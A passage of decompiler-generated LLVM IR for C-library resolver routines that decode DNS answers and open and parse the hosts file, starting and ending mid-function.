  %v0_8057a22 = phi i32 [ %v8_80579e8, %entry ], [ -1, %dec_label_pc_80579fd ], [ %v0_8057a22.pre, %dec_label_pc_8057a02 ]
  %v2_8057a21 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8057a21, i32* @ebx, align 4
  store i32 %v0_80579d4, i32* @edi, align 4
  ret i32 %v0_8057a22

; uselistorder directives
  uselistorder i32 %v1_80579f8, { 1, 0 }
  uselistorder i32 %v2_80579f6, { 0, 2, 1 }
  uselistorder i32 %v8_80579e8, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 -3, { 3, 2, 1, 8, 4, 5, 6, 0, 7 }
  uselistorder label %dec_label_pc_8057a21, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v2_8057a33 = call i32 @__length_dotted(i32 %tmp, i32 %tmp1)
  %v2_8057a38 = icmp slt i32 %v2_8057a33, 0
  %v1_8057a3a = add i32 %v2_8057a33, 4
  %v1_8057a3d = icmp eq i1 %v2_8057a38, false
  %v4_8057a3d = select i1 %v1_8057a3d, i32 %v1_8057a3a, i32 %v2_8057a33
  ret i32 %v4_8057a3d

; uselistorder directives
  uselistorder i32 %v2_8057a33, { 1, 0, 2 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8057a44 = load i32, i32* @ebp, align 4
  %v0_8057a45 = load i32, i32* @edi, align 4
  %v0_8057a46 = load i32, i32* @esi, align 4
  %v0_8057a47 = load i32, i32* @ebx, align 4
  store i32 %v0_8057a47, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_8057a68 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8057a68, i32* %eax.global-to-local, align 4
  %v4_8057a75 = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_8057a68, i32 256)
  store i32 %v4_8057a75, i32* %eax.global-to-local, align 4
  %v3_8057a7d = icmp slt i32 %v4_8057a75, 0
  store i32 %v4_8057a75, i32* @edi, align 4
  br i1 %v3_8057a7d, label %dec_label_pc_8057b30, label %dec_label_pc_8057a87

dec_label_pc_8057a87:                             ; preds = %entry
  %v0_8057a87 = load i32, i32* @ebx, align 4
  %v3_8057a87 = add i32 %v0_8057a87, %v4_8057a75
  %v0_8057a89 = load i32, i32* @esi, align 4
  %v2_8057a89 = sub i32 %v0_8057a89, %v3_8057a87
  %v1_8057a8b = add i32 %v2_8057a89, -10
  %v10_8057a8b = icmp slt i32 %v1_8057a8b, 0
  store i32 %v1_8057a8b, i32* @esi, align 4
  %v1_8057a96 = icmp eq i1 %v10_8057a8b, false
  br i1 %v1_8057a96, label %dec_label_pc_8057a9f, label %dec_label_pc_8057a98

dec_label_pc_8057a98:                             ; preds = %dec_label_pc_8057a87
  br label %dec_label_pc_8057b30

dec_label_pc_8057a9f:                             ; preds = %dec_label_pc_8057a87
  %v6_8057aa6 = add i32 %v3_8057a87, %tmp4
  store i32 %v6_8057aa6, i32* @ebx, align 4
  store i32 %v2_8057a68, i32* %eax.global-to-local, align 4
  %v1_8057ab2 = bitcast i32* %stack_var_-272 to i8*
  %v2_8057ab2 = call i32 @__GI_strdup(i8* %v1_8057ab2)
  store i32 %v2_8057ab2, i32* %eax.global-to-local, align 4
  %v0_8057ab7 = load i32, i32* @ebx, align 4
  %v1_8057ab7 = add i32 %v0_8057ab7, 4
  store i32 %v1_8057ab7, i32* %esi.global-to-local, align 4
  %v1_8057aba = load i32, i32* @ebp, align 4
  %v2_8057aba = inttoptr i32 %v1_8057aba to i32*
  store i32 %v2_8057ab2, i32* %v2_8057aba, align 4
  %v0_8057abd = load i32, i32* @ebx, align 4
  %v1_8057abd = inttoptr i32 %v0_8057abd to i8*
  %v2_8057abd = load i8, i8* %v1_8057abd, align 1
  %v3_8057abd = zext i8 %v2_8057abd to i32
  store i32 %v3_8057abd, i32* %eax.global-to-local, align 4
  %v1_8057ac0 = add i32 %v0_8057abd, 1
  %v2_8057ac0 = inttoptr i32 %v1_8057ac0 to i8*
  %v3_8057ac0 = load i8, i8* %v2_8057ac0, align 1
  %v4_8057ac0 = zext i8 %v3_8057ac0 to i32
  store i32 %v4_8057ac0, i32* %edx.global-to-local, align 4
  %v2_8057ac4 = mul nuw nsw i32 %v3_8057abd, 256
  %v2_8057ac7 = or i32 %v4_8057ac0, %v2_8057ac4
  store i32 %v2_8057ac7, i32* %eax.global-to-local, align 4
  %v1_8057ac9 = load i32, i32* @ebp, align 4
  %v2_8057ac9 = add i32 %v1_8057ac9, 4
  %v3_8057ac9 = inttoptr i32 %v2_8057ac9 to i32*
  store i32 %v2_8057ac7, i32* %v3_8057ac9, align 4
  %v0_8057acc = load i32, i32* @ebx, align 4
  %v1_8057acc = add i32 %v0_8057acc, 2
  %v2_8057acc = inttoptr i32 %v1_8057acc to i8*
  %v3_8057acc = load i8, i8* %v2_8057acc, align 1
  %v4_8057acc = zext i8 %v3_8057acc to i32
  store i32 %v4_8057acc, i32* %eax.global-to-local, align 4
  %v1_8057ad0 = add i32 %v0_8057acc, 3
  %v2_8057ad0 = inttoptr i32 %v1_8057ad0 to i8*
  %v3_8057ad0 = load i8, i8* %v2_8057ad0, align 1
  %v4_8057ad0 = zext i8 %v3_8057ad0 to i32
  store i32 %v4_8057ad0, i32* %edx.global-to-local, align 4
  %v2_8057ad4 = mul nuw nsw i32 %v4_8057acc, 256
  %v2_8057ad7 = or i32 %v4_8057ad0, %v2_8057ad4
  store i32 %v2_8057ad7, i32* %eax.global-to-local, align 4
  %v1_8057ad9 = load i32, i32* @ebp, align 4
  %v2_8057ad9 = add i32 %v1_8057ad9, 8
  %v3_8057ad9 = inttoptr i32 %v2_8057ad9 to i32*
  store i32 %v2_8057ad7, i32* %v3_8057ad9, align 4
  %v0_8057adc = load i32, i32* @ebx, align 4
  %v1_8057adc = add i32 %v0_8057adc, 4
  %v2_8057adc = inttoptr i32 %v1_8057adc to i8*
  %v3_8057adc = load i8, i8* %v2_8057adc, align 1
  %v4_8057adc = zext i8 %v3_8057adc to i32
  store i32 %v4_8057adc, i32* %edx.global-to-local, align 4
  %v0_8057ae0 = load i32, i32* %esi.global-to-local, align 4
  %v1_8057ae0 = add i32 %v0_8057ae0, 1
  %v2_8057ae0 = inttoptr i32 %v1_8057ae0 to i8*
  %v3_8057ae0 = load i8, i8* %v2_8057ae0, align 1
  %v4_8057ae0 = zext i8 %v3_8057ae0 to i32
  store i32 %v4_8057ae0, i32* %eax.global-to-local, align 4
  %v1_8057ae4 = add i32 %v0_8057ae0, 2
  %v2_8057ae4 = inttoptr i32 %v1_8057ae4 to i8*
  %v3_8057ae4 = load i8, i8* %v2_8057ae4, align 1
  %v4_8057ae4 = zext i8 %v3_8057ae4 to i32
  %v2_8057ae8 = mul nuw i32 %v4_8057adc, 16777216
  %v2_8057aeb = mul nuw nsw i32 %v4_8057ae0, 65536
  store i32 %v2_8057aeb, i32* %eax.global-to-local, align 4
  %v2_8057aee = or i32 %v2_8057aeb, %v2_8057ae8
  store i32 %v2_8057aee, i32* %edx.global-to-local, align 4
  %v1_8057af0 = add i32 %v0_8057ae0, 3
  %v2_8057af0 = inttoptr i32 %v1_8057af0 to i8*
  %v3_8057af0 = load i8, i8* %v2_8057af0, align 1
  %v4_8057af0 = zext i8 %v3_8057af0 to i32
  store i32 %v4_8057af0, i32* %eax.global-to-local, align 4
  %v2_8057af4 = mul nuw nsw i32 %v4_8057ae4, 256
  %v2_8057af7 = or i32 %v4_8057af0, %v2_8057aee
  store i32 %v2_8057af7, i32* %edx.global-to-local, align 4
  %v2_8057af9 = or i32 %v2_8057af7, %v2_8057af4
  store i32 %v2_8057af9, i32* @ecx, align 4
  %v1_8057afb = load i32, i32* @ebp, align 4
  %v2_8057afb = add i32 %v1_8057afb, 12
  %v3_8057afb = inttoptr i32 %v2_8057afb to i32*
  store i32 %v2_8057af9, i32* %v3_8057afb, align 4
  %v0_8057afe = load i32, i32* @ebx, align 4
  %v1_8057afe = add i32 %v0_8057afe, 8
  %v2_8057afe = inttoptr i32 %v1_8057afe to i8*
  %v3_8057afe = load i8, i8* %v2_8057afe, align 1
  %v4_8057afe = zext i8 %v3_8057afe to i32
  store i32 %v4_8057afe, i32* %edx.global-to-local, align 4
  %v1_8057b02 = add i32 %v0_8057afe, 9
  %v2_8057b02 = inttoptr i32 %v1_8057b02 to i8*
  %v3_8057b02 = load i8, i8* %v2_8057b02, align 1
  %v4_8057b02 = zext i8 %v3_8057b02 to i32
  store i32 %v4_8057b02, i32* %eax.global-to-local, align 4
  %v1_8057b06 = add i32 %v0_8057afe, 10
  %v1_8057b09 = load i32, i32* @ebp, align 4
  %v2_8057b09 = add i32 %v1_8057b09, 20
  %v3_8057b09 = inttoptr i32 %v2_8057b09 to i32*
  store i32 %v1_8057b06, i32* %v3_8057b09, align 4
  %v0_8057b0c = load i32, i32* %edx.global-to-local, align 4
  %v2_8057b0c = mul i32 %v0_8057b0c, 256
  %v1_8057b0f = load i32, i32* %eax.global-to-local, align 4
  %v2_8057b0f = or i32 %v1_8057b0f, %v2_8057b0c
  store i32 %v2_8057b0f, i32* @edx, align 4
  %v1_8057b11 = load i32, i32* @ebp, align 4
  %v2_8057b11 = add i32 %v1_8057b11, 16
  %v3_8057b11 = inttoptr i32 %v2_8057b11 to i32*
  store i32 %v2_8057b0f, i32* %v3_8057b11, align 4
  %v1_8057b1b = add i32 %v3_8057a87, 10
  store i32 %v1_8057b1b, i32* %eax.global-to-local, align 4
  %v1_8057b1e = load i32, i32* @ebp, align 4
  %v2_8057b1e = add i32 %v1_8057b1e, 24
  %v3_8057b1e = inttoptr i32 %v2_8057b1e to i32*
  store i32 %v1_8057b1b, i32* %v3_8057b1e, align 4
  %v4_8057b21 = load i32, i32* @edx, align 4
  %v5_8057b25 = icmp slt i32 %v1_8057a8b, %v4_8057b21
  br i1 %v5_8057b25, label %dec_label_pc_8057b27, label %dec_label_pc_8057b2c

dec_label_pc_8057b27:                             ; preds = %dec_label_pc_8057a9f
  br label %dec_label_pc_8057b30

dec_label_pc_8057b2c:                             ; preds = %dec_label_pc_8057a9f
  %v1_8057b2c = load i32, i32* @edi, align 4
  %v2_8057b2c = add i32 %v4_8057b21, 10
  %v3_8057b2c = add i32 %v2_8057b2c, %v1_8057b2c
  br label %dec_label_pc_8057b30

dec_label_pc_8057b30:                             ; preds = %entry, %dec_label_pc_8057b27, %dec_label_pc_8057a98, %dec_label_pc_8057b2c
  %v0_8057b36 = phi i32 [ %v4_8057a75, %entry ], [ -1, %dec_label_pc_8057b27 ], [ %v1_8057a8b, %dec_label_pc_8057a98 ], [ %v3_8057b2c, %dec_label_pc_8057b2c ]
  store i32 %v0_8057b36, i32* %eax.global-to-local, align 4
  %v2_8057b38 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8057b38, i32* @ebx, align 4
  store i32 %v0_8057a46, i32* @esi, align 4
  store i32 %v0_8057a45, i32* @edi, align 4
  store i32 %v0_8057a44, i32* @ebp, align 4
  ret i32 %v0_8057b36

; uselistorder directives
  uselistorder i32 %v0_8057b36, { 1, 0 }
  uselistorder i32 %v2_8057aeb, { 1, 0 }
  uselistorder i32 %v1_8057a8b, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8057a87, { 1, 0, 2 }
  uselistorder i32 %v4_8057a75, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_8057a68, { 1, 0, 2 }
  uselistorder i32 24, { 32, 33, 21, 0, 34, 35, 36, 22, 5, 10, 39, 11, 12, 13, 37, 23, 24, 25, 26, 27, 28, 29, 41, 2, 38, 14, 15, 16, 17, 18, 19, 20, 3, 30, 4, 6, 7, 8, 9, 31, 1, 40 }
  uselistorder i32 20, { 34, 35, 36, 37, 2, 18, 41, 5, 42, 38, 39, 3, 19, 20, 1, 7, 8, 33, 9, 10, 11, 21, 22, 23, 24, 25, 6, 26, 27, 44, 40, 4, 12, 13, 14, 15, 16, 17, 28, 29, 30, 31, 32, 43, 0 }
  uselistorder i32 9, { 19, 20, 21, 22, 7, 23, 13, 14, 5, 12, 0, 8, 15, 16, 17, 18, 9, 10, 11, 6, 3, 2, 24, 1, 25, 4 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5, 7, 9, 8, 11, 10 }
  uselistorder i32 3, { 57, 58, 59, 60, 61, 62, 22, 0, 13, 1, 23, 2, 18, 56, 3, 63, 24, 5, 4, 6, 11, 12, 10, 25, 14, 26, 48, 21, 49, 32, 33, 34, 35, 36, 37, 64, 19, 20, 38, 27, 16, 17, 7, 39, 30, 54, 29, 55, 28, 40, 9, 41, 42, 43, 44, 50, 51, 52, 53, 8, 31, 45, 46, 47, 15 }
  uselistorder i32 -10, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8057b30, { 3, 1, 2, 0 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v3_8057b4d = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_805b545.575 to i32), i32 ptrtoint (i32* @global_var_805b510.563 to i32))
  store i32 %v3_8057b4d, i32* @eax, align 4
  %v1_8057b55 = icmp eq i32 %v3_8057b4d, 0
  %v1_8057b57 = icmp eq i1 %v1_8057b55, false
  br i1 %v1_8057b57, label %dec_label_pc_8057b6d, label %dec_label_pc_8057b59

dec_label_pc_8057b59:                             ; preds = %entry
  %v3_8057b65 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_805b550.576 to i32), i32 ptrtoint (i32* @global_var_805b510.563 to i32))
  br label %dec_label_pc_8057b6d

dec_label_pc_8057b6d:                             ; preds = %entry, %dec_label_pc_8057b59
  %v0_8057b70 = phi i32 [ %v3_8057b4d, %entry ], [ %v3_8057b65, %dec_label_pc_8057b59 ]
  ret i32 %v0_8057b70

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 3, 2, 1, 0, 6, 5, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_805b510.563 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_8057b6d, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp60 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_8057b71 = load i32, i32* @ebp, align 4
  %v0_8057b72 = load i32, i32* @edi, align 4
  %v0_8057b73 = load i32, i32* @esi, align 4
  %v0_8057b74 = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_8057b82 = sub i32 0, %arg6
  %v1_8057b84 = urem i32 %v1_8057b82, 4
  %v2_8057b84 = icmp eq i32 %v1_8057b84, 0
  store i32 %v1_8057b84, i32* %eax.global-to-local, align 4
  br i1 %v2_8057b84, label %dec_label_pc_8057b95, label %dec_label_pc_8057b89

dec_label_pc_8057b89:                             ; preds = %entry
  %v2_8057b89 = sub i32 %arg7, %v1_8057b84
  %v7_8057b89 = icmp ugt i32 %v1_8057b84, %arg7
  br i1 %v7_8057b89, label %dec_label_pc_8057e39, label %dec_label_pc_8057b91

dec_label_pc_8057b91:                             ; preds = %dec_label_pc_8057b89
  %v2_8057b91 = add i32 %v1_8057b84, %arg6
  store i32 %v2_8057b91, i32* @ebx, align 4
  store i32 %v2_8057b89, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8057b95

dec_label_pc_8057b95:                             ; preds = %entry, %dec_label_pc_8057b91
  %v0_8057ba3 = phi i32 [ %arg6, %entry ], [ %v2_8057b91, %dec_label_pc_8057b91 ]
  %v0_8057baa = phi i32 [ %arg7, %entry ], [ %v2_8057b89, %dec_label_pc_8057b91 ]
  %tmp = icmp ult i32 %v0_8057baa, 32
  br i1 %tmp, label %dec_label_pc_8057e39, label %dec_label_pc_8057b9e

dec_label_pc_8057b9e:                             ; preds = %dec_label_pc_8057b95
  %v12_8057b9e = icmp eq i32 %arg4, 1
  %v1_8057ba3 = add i32 %v0_8057ba3, 32
  store i32 %v1_8057ba3, i32* %eax.global-to-local, align 4
  %v1_8057baa = add i32 %v0_8057baa, -32
  store i32 %v1_8057baa, i32* @ebp, align 4
  br i1 %v12_8057b9e, label %dec_label_pc_8057b9e.dec_label_pc_8057ce9_crit_edge, label %dec_label_pc_8057bb3

dec_label_pc_8057b9e.dec_label_pc_8057ce9_crit_edge: ; preds = %dec_label_pc_8057b9e
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_8057ce9

dec_label_pc_8057bb3:                             ; preds = %dec_label_pc_8057b9e
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_8057bba = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_8057bba, align 4
  %tmp144 = icmp ult i32 %v1_8057baa, 4
  br i1 %tmp144, label %dec_label_pc_8057e39, label %dec_label_pc_8057bc6

dec_label_pc_8057bc6:                             ; preds = %dec_label_pc_8057bb3
  %v0_8057bc6 = load i32, i32* %edx.global-to-local, align 4
  %v1_8057bc6 = add i32 %v0_8057bc6, -36
  store i32 %v1_8057bc6, i32* %eax.global-to-local, align 4
  %tmp145 = icmp ult i32 %v1_8057bc6, 8
  br i1 %tmp145, label %dec_label_pc_8057e39, label %dec_label_pc_8057bd2

dec_label_pc_8057bd2:                             ; preds = %dec_label_pc_8057bc6
  %v0_8057bd2 = load i32, i32* @ebp, align 4
  %tmp146 = icmp ult i32 %v0_8057bd2, 16
  br i1 %tmp146, label %dec_label_pc_8057e39, label %dec_label_pc_8057bdb

dec_label_pc_8057bdb:                             ; preds = %dec_label_pc_8057bd2
  %v1_8057bdb = add i32 %v0_8057bc6, -48
  store i32 %v1_8057bdb, i32* %eax.global-to-local, align 4
  %tmp147 = icmp ult i32 %v1_8057bdb, 8
  br i1 %tmp147, label %dec_label_pc_8057e39, label %dec_label_pc_8057be7

dec_label_pc_8057be7:                             ; preds = %dec_label_pc_8057bdb
  %v0_8057be7 = load i32, i32* @ebx, align 4
  %v1_8057be7 = add i32 %v0_8057be7, 48
  %v1_8057bea = add i32 %v0_8057bc6, -44
  store i32 %v1_8057bea, i32* @ebp, align 4
  %v1_8057bf1 = add i32 %v0_8057bc6, -56
  store i32 %v1_8057bf1, i32* @eax, align 4
  %v7_8057bf4 = icmp ult i32 %v1_8057bf1, %v1_8057bea
  %v1_8057bf6 = add i32 %v0_8057be7, 36
  store i32 %v1_8057bf6, i32* @edi, align 4
  br i1 %v7_8057bf4, label %dec_label_pc_8057c00, label %dec_label_pc_8057bfb

dec_label_pc_8057bfb:                             ; preds = %dec_label_pc_8057be7
  %v1_8057bfb = add i32 %v0_8057be7, 44
  store i32 %v1_8057bfb, i32* @esi, align 4
  br label %dec_label_pc_8057c05

dec_label_pc_8057c00:                             ; preds = %dec_label_pc_8057be7
  %v1_8057c00 = add i32 %v0_8057be7, 56
  store i32 %v1_8057c00, i32* @esi, align 4
  store i32 %v1_8057bf1, i32* @ebp, align 4
  br label %dec_label_pc_8057c05

dec_label_pc_8057c05:                             ; preds = %dec_label_pc_8057bfb, %dec_label_pc_8057c00
  %v0_8057c05 = phi i32 [ %v1_8057bea, %dec_label_pc_8057bfb ], [ %v1_8057bf1, %dec_label_pc_8057c00 ]
  %tmp148 = icmp ult i32 %v0_8057c05, 80
  br i1 %tmp148, label %dec_label_pc_8057e39, label %dec_label_pc_8057c0e

dec_label_pc_8057c0e:                             ; preds = %dec_label_pc_8057c05
  %v0_8057c0e = call i32 @__open_etc_hosts()
  store i32 %v0_8057c0e, i32* %eax.global-to-local, align 4
  %v1_8057c13 = icmp eq i32 %v0_8057c0e, 0
  br i1 %v1_8057c13, label %dec_label_pc_8057c3b, label %dec_label_pc_8057c1b

dec_label_pc_8057c1b:                             ; preds = %dec_label_pc_8057c0e
  store i32 %v1_8057ba3, i32* %edx.global-to-local, align 4
  store i32 %v1_8057be7, i32* %eax.global-to-local, align 4
  %v0_8057c23 = load i32, i32* @edi, align 4
  %v0_8057c27 = load i32, i32* @esi, align 4
  %v4_8057c2b = inttoptr i32 %v1_8057ba3 to i8*
  br label %dec_label_pc_8057ce9

dec_label_pc_8057c3b:                             ; preds = %dec_label_pc_8057c0e
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_8057c3f = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_8057c3f, align 4
  %v1_8057c45 = call i32 @__errno_location(i32 0)
  store i32 %v1_8057c45, i32* %eax.global-to-local, align 4
  %v1_8057c4a = inttoptr i32 %v1_8057c45 to i32*
  %v2_8057c4a = load i32, i32* %v1_8057c4a, align 4
  store i32 %v2_8057c4a, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057e39

dec_label_pc_8057c55:                             ; preds = %dec_label_pc_8057dbc
  %v2_8057c55 = load i8*, i8** %stack_var_-44, align 4
  %v3_8057c55 = ptrtoint i8* %v2_8057c55 to i32
  store i32 %v3_8057c55, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_8057c5c = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_8057c55, i32* %v2_8057c5c, align 4
  %v0_8057c5e = load i32, i32* %eax.global-to-local, align 4
  %v1_8057c5e = add i32 %v0_8057c5e, 4
  %v2_8057c5e = inttoptr i32 %v1_8057c5e to i32*
  store i32 0, i32* %v2_8057c5e, align 4
  %v0_8057c65 = load i32, i32* @ebx, align 4
  %v1_8057c65 = add i32 %v0_8057c65, 4
  %v2_8057c65 = inttoptr i32 %v1_8057c65 to i32*
  %v3_8057c65 = load i32, i32* %v2_8057c65, align 4
  store i32 %v3_8057c65, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_8057c65, i32* %arg5, align 4
  %v1_8057c6e = add i32 %tmp60, 8
  %v2_8057c6e = inttoptr i32 %v1_8057c6e to i32*
  store i32 2, i32* %v2_8057c6e, align 4
  %v0_8057c75 = load i32, i32* %edx.global-to-local, align 4
  %v1_8057c75 = add i32 %v0_8057c75, 12
  %v2_8057c75 = inttoptr i32 %v1_8057c75 to i32*
  store i32 4, i32* %v2_8057c75, align 4
  br label %dec_label_pc_8057cae

dec_label_pc_8057c82:                             ; preds = %dec_label_pc_8057dde
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  store i32 %storemerge3, i32* %edx.global-to-local, align 4
  %v2_8057c8a = inttoptr i32 %storemerge3 to i32*
  store i32 %stack_var_-36.0, i32* %v2_8057c8a, align 4
  %v0_8057c8c = load i32, i32* %edx.global-to-local, align 4
  %v1_8057c8c = add i32 %v0_8057c8c, 4
  %v2_8057c8c = inttoptr i32 %v1_8057c8c to i32*
  store i32 0, i32* %v2_8057c8c, align 4
  %v0_8057c93 = load i32, i32* @ebx, align 4
  %v1_8057c93 = add i32 %v0_8057c93, 4
  %v2_8057c93 = inttoptr i32 %v1_8057c93 to i32*
  %v3_8057c93 = load i32, i32* %v2_8057c93, align 4
  store i32 %v3_8057c93, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_8057c93, i32* %arg5, align 4
  %v1_8057c9c = add i32 %tmp60, 8
  %v2_8057c9c = inttoptr i32 %v1_8057c9c to i32*
  store i32 10, i32* %v2_8057c9c, align 4
  %v0_8057ca3 = load i32, i32* %edx.global-to-local, align 4
  %v1_8057ca3 = add i32 %v0_8057ca3, 12
  %v2_8057ca3 = inttoptr i32 %v1_8057ca3 to i32*
  store i32 16, i32* %v2_8057ca3, align 4
  br label %dec_label_pc_8057cae

dec_label_pc_8057cae:                             ; preds = %dec_label_pc_8057c55, %dec_label_pc_8057c82
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_8057c55 ], [ %storemerge3, %dec_label_pc_8057c82 ]
  %v1_8057cae = load i32, i32* %edx.global-to-local, align 4
  %v2_8057cae = add i32 %v1_8057cae, 16
  %v3_8057cae = inttoptr i32 %v2_8057cae to i32*
  store i32 %storemerge, i32* %v3_8057cae, align 4
  %v0_8057cb1 = load i32, i32* @ebx, align 4
  %v1_8057cb1 = add i32 %v0_8057cb1, 8
  %v1_8057cb4 = load i32, i32* %edx.global-to-local, align 4
  %v2_8057cb4 = add i32 %v1_8057cb4, 4
  %v3_8057cb4 = inttoptr i32 %v2_8057cb4 to i32*
  store i32 %v1_8057cb1, i32* %v3_8057cb4, align 4
  store i32 %arg8, i32* @eax, align 4
  %v0_8057cbb = load i32, i32* %edx.global-to-local, align 4
  %v2_8057cbb = inttoptr i32 %arg8 to i32*
  store i32 %v0_8057cbb, i32* %v2_8057cbb, align 4
  br label %dec_label_pc_8057e19

dec_label_pc_8057ce9:                             ; preds = %dec_label_pc_8057b9e.dec_label_pc_8057ce9_crit_edge, %dec_label_pc_8057c1b
  %v1_8057ced.pre-phi = phi i32* [ %.pre, %dec_label_pc_8057b9e.dec_label_pc_8057ce9_crit_edge ], [ %v1_8057bba, %dec_label_pc_8057c1b ]
  %storemerge4 = phi i8* [ null, %dec_label_pc_8057b9e.dec_label_pc_8057ce9_crit_edge ], [ %v4_8057c2b, %dec_label_pc_8057c1b ]
  %stack_var_-20.0.in = phi i32 [ %v1_8057ba3, %dec_label_pc_8057b9e.dec_label_pc_8057ce9_crit_edge ], [ %v0_8057c27, %dec_label_pc_8057c1b ]
  %stack_var_-36.0 = phi i32 [ 0, %dec_label_pc_8057b9e.dec_label_pc_8057ce9_crit_edge ], [ %v1_8057ba3, %dec_label_pc_8057c1b ]
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_8057b9e.dec_label_pc_8057ce9_crit_edge ], [ %v0_8057c23, %dec_label_pc_8057c1b ]
  %stack_var_4.0 = phi i32 [ %arg1, %dec_label_pc_8057b9e.dec_label_pc_8057ce9_crit_edge ], [ %v0_8057c0e, %dec_label_pc_8057c1b ]
  %storemerge3 = phi i32 [ 0, %dec_label_pc_8057b9e.dec_label_pc_8057ce9_crit_edge ], [ %v1_8057be7, %dec_label_pc_8057c1b ]
  store i8* %storemerge4, i8** %stack_var_-44, align 4
  %stack_var_-20.0 = inttoptr i32 %stack_var_-20.0.in to i8*
  store i32 %arg9, i32* @edx, align 4
  store i32 1, i32* %v1_8057ced.pre-phi, align 4
  %v12_8057d77 = icmp eq i32 %arg4, 2
  %v2_8057da2 = inttoptr i32 %arg2 to i8*
  %v12_8057db5 = icmp eq i32 %arg3, 2
  %v12_8057dd7 = icmp eq i32 %arg3, 10
  %v1_8057d81 = icmp eq i1 %v12_8057d77, false
  %v1_8057dba = icmp eq i1 %v12_8057db5, false
  %v1_8057ddc = icmp eq i1 %v12_8057dd7, false
  br label %dec_label_pc_8057dff.outer

dec_label_pc_8057dff.outer:                       ; preds = %dec_label_pc_8057dd7, %dec_label_pc_8057dde, %dec_label_pc_8057dbc, %dec_label_pc_8057ce9
  %stack_var_-28.0.ph = phi i32 [ 1, %dec_label_pc_8057ce9 ], [ 2, %dec_label_pc_8057dbc ], [ 2, %dec_label_pc_8057dde ], [ 2, %dec_label_pc_8057dd7 ]
  br label %dec_label_pc_8057dff

dec_label_pc_8057d00:                             ; preds = %dec_label_pc_8057dff
  %v3_8057d08 = call i32 @__GI_strchr(i8* %stack_var_-20.0, i32 35)
  store i32 %v3_8057d08, i32* @eax, align 4
  %v1_8057d10 = icmp eq i32 %v3_8057d08, 0
  br i1 %v1_8057d10, label %dec_label_pc_8057d17, label %dec_label_pc_8057d14

dec_label_pc_8057d14:                             ; preds = %dec_label_pc_8057d00
  %v1_8057d14 = inttoptr i32 %v3_8057d08 to i8*
  store i8 0, i8* %v1_8057d14, align 1
  br label %dec_label_pc_8057d17

dec_label_pc_8057d17:                             ; preds = %dec_label_pc_8057d00, %dec_label_pc_8057d14
  store i32 %stack_var_-20.0.in, i32* @ecx, align 4
  store i32 0, i32* @edi, align 4
  %v2_8057d5734 = load i8, i8* %stack_var_-20.0, align 1
  %v3_8057d5735 = icmp eq i8 %v2_8057d5734, 0
  %v1_8057d5a41 = icmp eq i1 %v3_8057d5735, false
  br i1 %v1_8057d5a41, label %dec_label_pc_8057d23.preheader.preheader, label %dec_label_pc_8057d5c

dec_label_pc_8057d23.preheader.preheader:         ; preds = %dec_label_pc_8057d17
  %v4_8057d2398.pre = load i32, i32* @eax, align 4
  br label %dec_label_pc_8057d23.preheader

dec_label_pc_8057d1f:                             ; preds = %dec_label_pc_8057d29
  store i8 0, i8* %v1_8057d23104, align 1
  %v0_8057d22 = load i32, i32* @ecx, align 4
  %v1_8057d22 = add i32 %v0_8057d22, 1
  store i32 %v1_8057d22, i32* @ecx, align 4
  %v1_8057d23 = inttoptr i32 %v1_8057d22 to i8*
  %v2_8057d23 = load i8, i8* %v1_8057d23, align 1
  %v3_8057d23 = zext i8 %v2_8057d23 to i32
  %v4_8057d23 = load i32, i32* %eax.global-to-local, align 4
  %v5_8057d23 = and i32 %v4_8057d23, -256
  %v6_8057d23 = or i32 %v5_8057d23, %v3_8057d23
  store i32 %v6_8057d23, i32* @eax, align 4
